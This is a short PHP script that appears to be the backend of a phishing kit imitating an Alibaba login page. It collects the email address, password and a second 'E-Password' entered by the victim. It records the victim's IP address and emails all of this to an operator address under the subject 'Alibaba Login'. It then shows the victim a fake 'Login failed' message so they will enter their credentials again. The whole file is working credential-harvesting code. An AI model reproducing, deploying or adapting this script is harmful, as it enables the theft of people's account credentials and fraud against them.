<?php

$ip = getenv("REMOTE_ADDR");
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$epassword = trim($_POST['epassword']);
$server = date("D/M/d, Y g:i a");

if($email != null && $password != null){
	
	$own = 'email@domain.com';
	$subj = "Alibaba Login - ".$ip;

	$headers = "From: Result <logz@couklas.org> \n";
	$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
	$headers .= "MIME-Version: 1.0\n";

	$message = "[Ali-Email Account] \n\n";
	$message .= "Email : ".$email."\n";
	$message .= "Password : ".$password."\n";
	$message .= "E-Password : ".$epassword."\n";
	$message .= "IP : ".$ip."\n";

	mail($own,$subj,$message,$headers);
	
	$signal = 'ok';
	$msg = 'Login failed! Please enter correct password';
	
	// $praga=rand();
	// $praga=md5($praga);
	
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>